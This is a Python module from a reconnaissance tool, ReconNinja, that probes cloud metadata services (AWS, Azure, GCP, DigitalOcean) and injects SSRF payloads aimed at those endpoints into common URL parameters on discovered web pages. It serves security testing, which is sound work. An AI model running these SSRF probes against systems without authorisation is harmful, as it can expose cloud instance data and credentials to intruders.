"""
core/cloud_meta.py — ReconNinja v7.0.0
Cloud Metadata Service (IMDS) SSRF Probe.

Detects Server-Side Request Forgery vectors that could reach cloud metadata endpoints:
  - AWS EC2 IMDS: http://169.254.169.254/latest/meta-data/
  - AWS IMDSv2: token-based endpoint
  - Azure IMDS: http://169.254.169.254/metadata/instance?api-version=2021-02-01
  - GCP metadata: http://metadata.google.internal/computeMetadata/v1/
  - DigitalOcean: http://169.254.169.254/metadata/v1/

Also checks if open redirect / SSRF parameters on discovered URLs can
reach these addresses via parameter injection.

No external tools required — pure Python stdlib.
"""

from __future__ import annotations

import concurrent.futures
import json
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from utils.helpers import ensure_dir
from utils.logger import safe_print, log

# ── IMDS endpoint definitions ─────────────────────────────────────────────────

IMDS_TARGETS = [
    {
        "provider": "AWS EC2 IMDSv1",
        "url":      "http://169.254.169.254/latest/meta-data/",
        "headers":  {},
        "indicator": ["ami-id", "instance-id", "hostname"],
        "severity": "critical",
    },
    {
        "provider": "AWS EC2 IMDSv2 token",
        "url":      "http://169.254.169.254/latest/api/token",
        "headers":  {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        "method":   "PUT",
        "indicator": [],  # any 200 = vulnerable
        "severity": "critical",
    },
    {
        "provider": "Azure IMDS",
        "url":      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "headers":  {"Metadata": "true"},
        "indicator": ["compute", "network", "subscriptionId"],
        "severity": "critical",
    },
    {
        "provider": "GCP Metadata",
        "url":      "http://metadata.google.internal/computeMetadata/v1/",
        "headers":  {"Metadata-Flavor": "Google"},
        "indicator": ["instance", "project"],
        "severity": "critical",
    },
    {
        "provider": "DigitalOcean Metadata",
        "url":      "http://169.254.169.254/metadata/v1/",
        "headers":  {},
        "indicator": ["id", "hostname", "region"],
        "severity": "high",
    },
]

# ── SSRF test parameters injected into discovered URLs ────────────────────────

SSRF_PARAMS = [
    "url", "redirect", "next", "return", "goto", "dest", "destination",
    "path", "callback", "host", "proxy", "fetch", "load", "ref",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://metadata.google.internal/computeMetadata/v1/",
]


@dataclass
class CloudMetaFinding:
    provider:    str
    url:         str
    vulnerable:  bool
    method:      str    = "GET"
    response:    str    = ""
    severity:    str    = "critical"

    def to_dict(self) -> dict:
        return {
            "provider":   self.provider,
            "url":        self.url,
            "vulnerable": self.vulnerable,
            "method":     self.method,
            "response":   self.response[:200],
            "severity":   self.severity,
        }


@dataclass
class CloudMetaResult:
    target:    str
    findings:  list[CloudMetaFinding] = field(default_factory=list)
    ssrf_vectors: list[dict]          = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "target":       self.target,
            "findings":     [f.to_dict() for f in self.findings],
            "ssrf_vectors": self.ssrf_vectors,
        }


# ── Direct IMDS probe ─────────────────────────────────────────────────────────

def _probe_imds(target_def: dict, timeout: int = 5) -> CloudMetaFinding:
    """Direct probe of IMDS endpoint (only reachable from cloud instance or via SSRF)."""
    method    = target_def.get("method", "GET")
    url       = target_def["url"]
    headers   = {
        "User-Agent": "ReconNinja/7.0.0",
        **target_def.get("headers", {}),
    }
    indicators = target_def.get("indicator", [])

    try:
        req = urllib.request.Request(url, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(1024).decode(errors="ignore")
            is_vuln = not indicators or any(ind in body for ind in indicators)
            return CloudMetaFinding(
                provider=target_def["provider"],
                url=url,
                vulnerable=is_vuln,
                method=method,
                response=body[:300],
                severity=target_def.get("severity", "critical"),
            )
    except Exception:
        return CloudMetaFinding(
            provider=target_def["provider"],
            url=url,
            vulnerable=False,
            method=method,
        )


# ── SSRF parameter injection ──────────────────────────────────────────────────

def _test_ssrf_params(web_urls: list[str], timeout: int = 5) -> list[dict]:
    """
    Inject SSRF payloads into URL parameters of discovered web URLs.
    Looks for metadata content echoed back in the response.
    """
    vectors = []
    tested: set[str] = set()

    for base_url in web_urls[:10]:
        for param in SSRF_PARAMS:
            for payload in SSRF_PAYLOADS[:2]:  # cap probes
                test_url = f"{base_url}?{param}={urllib.request.quote(payload)}"
                if test_url in tested:
                    continue
                tested.add(test_url)
                try:
                    req = urllib.request.Request(
                        test_url,
                        headers={"User-Agent": "Mozilla/5.0 (ReconNinja/7.0.0)"},
                    )
                    with urllib.request.urlopen(req, timeout=timeout) as r:
                        body = r.read(4096).decode(errors="ignore")
                        # Check if cloud metadata leaked
                        for indicator in ["ami-id", "instance-id", "subscriptionId", "computeMetadata"]:
                            if indicator in body:
                                vectors.append({
                                    "url":       test_url,
                                    "param":     param,
                                    "payload":   payload,
                                    "indicator": indicator,
                                    "severity":  "critical",
                                })
                                safe_print(
                                    f"  [danger]⚠  SSRF→IMDS: {test_url} leaks '{indicator}'![/]"
                                )
                except Exception:
                    pass

    return vectors


# ── Public API ────────────────────────────────────────────────────────────────

def cloud_meta_scan(
    target: str,
    web_urls: list[str],
    out_folder: Path,
    timeout: int = 5,
) -> CloudMetaResult:
    """
    Probe for cloud metadata service exposure (SSRF vector).

    Directly probes IMDS endpoints (works if running on cloud instance)
    and tests SSRF parameter injection on discovered web URLs.

    Args:
        target:    scan target
        web_urls:  live web URLs (from httpx)
        out_folder: output directory
        timeout:   per-request timeout

    Returns:
        CloudMetaResult
    """
    ensure_dir(out_folder)
    result = CloudMetaResult(target=target)
    safe_print(f"[info]▶ Cloud Metadata Probe — direct IMDS + SSRF param injection[/]")

    # Direct IMDS probes (parallel)
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        futs = {ex.submit(_probe_imds, t, timeout): t for t in IMDS_TARGETS}
        for fut in concurrent.futures.as_completed(futs):
            try:
                finding = fut.result()
                if finding.vulnerable:
                    result.findings.append(finding)
                    safe_print(
                        f"  [danger]⚠  IMDS EXPOSED: {finding.provider} @ {finding.url}[/]"
                    )
            except Exception as e:
                log.debug(f"IMDS probe error: {e}")

    # SSRF parameter injection on web URLs
    if web_urls:
        result.ssrf_vectors = _test_ssrf_params(web_urls, timeout=timeout)

    total = len(result.findings) + len(result.ssrf_vectors)
    severity = "danger" if total > 0 else "success"
    safe_print(
        f"[{severity}]✔ Cloud Meta: {len(result.findings)} IMDS exposure(s), "
        f"{len(result.ssrf_vectors)} SSRF vector(s)[/]"
    )

    # Save
    out_file = out_folder / "cloud_meta.txt"
    lines = [f"# Cloud Metadata Findings — {target}", ""]
    for f in result.findings:
        lines.append(f"[{f.severity.upper()}] {f.provider}: {f.url}")
        lines.append(f"  Response: {f.response[:150]}")
    for v in result.ssrf_vectors:
        lines.append(f"[CRITICAL] SSRF→IMDS: {v['url']} (indicator: {v['indicator']})")
    out_file.write_text("\n".join(lines))

    return result
